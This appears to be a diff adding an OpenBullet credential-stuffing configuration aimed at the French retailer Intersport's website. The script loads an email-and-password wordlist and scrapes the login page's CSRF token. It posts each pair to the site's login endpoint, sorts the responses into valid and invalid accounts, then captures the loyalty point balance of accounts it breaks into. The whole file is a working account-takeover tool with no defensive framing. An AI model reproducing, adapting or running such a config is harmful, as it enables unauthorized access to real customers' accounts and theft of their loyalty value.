@@ -1,0 +1,74 @@
+[SETTINGS]
+{
+  "Name": "Intersport.fr",
+  "SuggestedBots": 15,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-18T05:47:46.1622236+02:00",
+  "AdditionalInfo": "",
+  "Author": "ILBASS",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.intersport.fr/login/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<SOURCE>" LR "JsVars.CSRFToken = \"" "\";" -> VAR "Token" 
+
+REQUEST POST "https://www.intersport.fr/j_spring_security_check" 
+  CONTENT "j_username=<USER>&j_password=<PASS>&CSRFToken=<Token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.intersport.fr" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 97" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Origin: https://www.intersport.fr" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Referer: https://www.intersport.fr/login/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "[{\"success\": \"/checkout/multi\"}]" 
+  KEYCHAIN Failure OR 
+    KEY "[{\"error\": \"exists\"}]" 
+    KEY "[{\"error\": \"don't exists\"}]" 
+
+REQUEST GET "https://www.intersport.fr/my-account/fidelity/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Vous ne profitez pas encore des nombreux privilèges de notre carte INTERSPORT ? Rendez-vous en magasin, nous vous la remettrons avec plaisir." 
+
+#Point PARSE "<SOURCE>" LR "-required=\"true\" type=\"text\" readonly=\"readonly\" value=\"" "\"/><div " -> CAP "Point" 
+
